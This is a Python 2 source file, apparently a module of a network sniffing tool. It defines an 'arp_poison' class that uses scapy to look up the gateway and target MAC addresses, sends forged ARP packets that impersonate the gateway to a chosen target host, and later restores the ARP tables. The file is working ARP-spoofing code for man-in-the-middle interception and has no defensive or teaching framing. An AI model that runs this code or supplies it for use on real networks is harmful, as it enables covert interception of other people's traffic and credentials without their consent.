# coding = utf-8
from scapy.route import Route
from scapy.all import *
from scapy.layers.l2 import arping
import thread
from sendp_task import task

import MySniffConf


class arp_poison:
    '''

    '''

    def get_mac(self, ip):
        res, unans = arping(net=ip, verbose=0, timeout=3)
        mac_res = ''
        if res:
            for s, r in res.res:
                mac_res = r.src
        if mac_res is '':
            raise Exception('can not find ip: ' + str(ip) + ' mac ')
        return mac_res

    def get_gateway(self):
        route = Route()
        for nw, nm, gw, ifa, oip in route.routes:
            if ifa == MySniffConf.iface and nm & 0xFFFFFFFF == 0:
                return gw
        raise Exception("can not find Gateway")
        pass

    def __init__(self):
        self.local_ip_addr = get_if_addr(MySniffConf.iface)
        if MySniffConf.gateway is '':
            MySniffConf.gateway = self.get_gateway()
        self.gateway_ip_addr = MySniffConf.gateway
        self.gateway_mac_adr = self.get_mac(self.gateway_ip_addr)
        self.target_ip_addr=MySniffConf.ARPSpoofAddr
        self.target_mac_addr = self.get_mac(self.target_ip_addr)

    def poison(self):
        # posion -> target
        # task(self.build_pkg(MySniffConf.ARPSpoofAddr, MySniffConf.gateway)).start()

        # posion -> target
        task(self.build_pkg(MySniffConf.gateway, MySniffConf.ARPSpoofAddr)).start()

    def recovery(self):
        for i in xrange(5):
            pkg = Ether(dst='ff:ff:ff:ff:ff:ff') / \
                ARP(op=2, psrc=self.gateway_ip_addr,hwsrc=self.gateway_mac_adr)
            sendp(pkg,verbose=0)

            pkg = Ether(dst='ff:ff:ff:ff:ff:ff') / \
                ARP(op=2, psrc=self.target_ip_addr,hwsrc=self.target_mac_addr)
            sendp(pkg,verbose=0)
        pass

    def build_pkg(self, src_ip, target_ip):
        target_mac = self.target_mac_addr
        return Ether(dst=target_mac) / ARP(op="who-has", psrc=src_ip, pdst=target_ip)
    pass


if __name__ == '__main__':
    pass
